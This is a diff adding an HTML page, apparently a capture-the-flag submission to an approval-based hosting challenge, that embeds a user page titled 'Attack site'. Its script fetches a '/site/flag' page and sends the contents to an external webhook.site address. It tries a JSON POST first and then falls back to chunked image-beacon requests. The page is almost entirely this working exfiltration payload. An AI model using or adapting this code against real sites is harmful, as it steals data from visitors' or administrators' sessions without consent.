@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <meta http-equiv="Content-Security-Policy" content="default-src 'none'">
+                    <title>User made site hosted on our Free Parking Network</title>
+                </head>
+                <body>
+                    <a href="/approve/70ee545d66af5315b88b23d03470334c/0455552076629b50fd1cc4856be634e0">Approve this site</a>
+                    <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attack site</title>
+</head>
+<body>
+  <h1>Loading…</h1>
+  <script>
+    (async () => {
+      try {
+        let resp = await fetch('/site/flag');
+        let text = await resp.text();
+
+        try {
+          await fetch('https://webhook.site/51512940-3043-418e-b4ca-f2d40a30afb0', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ flag_page: text })
+          });
+        } catch (e) {
+          console.warn('POST JSON failed, fallback to GET beacon', e);
+        }
+
+        const chunkSize = 800;
+        for (let i = 0; i < text.length; i += chunkSize) {
+          const part = text.slice(i, i + chunkSize);
+          const encoded = encodeURIComponent(part);
+          const img = new Image();
+          img.src = 'https://webhook.site/51512940-3043-418e-b4ca-f2d40a30afb0'
+                    + '?i=' + i + '&d=' + encoded;
+        }
+      } catch (err) {
+        console.error('Overall exfil error:', err);
+      }
+    })();
+  </script>
+</body>
+</html>
+                </body>
+                </html>
